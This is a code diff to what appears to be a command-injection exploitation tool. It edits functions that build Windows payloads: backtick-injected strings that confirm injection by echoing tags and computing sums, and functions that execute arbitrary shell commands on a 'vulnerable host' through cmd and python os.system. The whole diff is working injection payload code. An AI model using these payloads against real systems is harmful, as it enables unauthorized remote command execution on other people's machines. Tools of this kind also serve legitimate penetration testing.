@@ -28,18 +28,18 @@ def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     if separator == "":
       payload = ("print(`echo " + TAG + "`." +
-                  "`for /f \"delims=\" %i in ('cmd /c \"" + 
+                  "`for /f \"tokens=*\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i <nul`." +
+                  "\"') do @set /p =%i < nul`." +
                   "`echo " + TAG + "`." +
                   "`echo " + TAG + "`)" +
                   separator
                 )
     else:
       payload = ("print(`echo " + TAG +
-                  separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
+                  separator + "for /f \"tokens=*\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i <nul" + 
+                  "\"') do @set /p =%i < nul" + 
                   separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
@@ -65,7 +65,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
     if separator == "":
       payload = ("print(`echo " + TAG + "`." +
                   "` cmd /c " + python_payload + "`." +
@@ -102,9 +102,9 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
-    cmd = ( "for /f \"delims=\" %i in ('cmd /c " + 
+    cmd = ( "for /f \"tokens=*\" %i in ('cmd /c " + 
             cmd +
-            "') do @set /p =%i <nul"
+            "') do @set /p =%i < nul"
           )
     if separator == "":
       payload = ("print(`echo " + TAG + "`." + 
@@ -148,9 +148,9 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       payload = (separator +cmd + " "
                 )
     else:
-      python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
-                        settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + "')\"" + 
-                        "') do @set /p =%i <nul"
+      python_payload = ("for /f \"tokens=*\" %i in ('cmd /c " + 
+                        settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + "')\"" + 
+                        "') do @set /p =%i < nul"
                        )
 
       if separator == "":
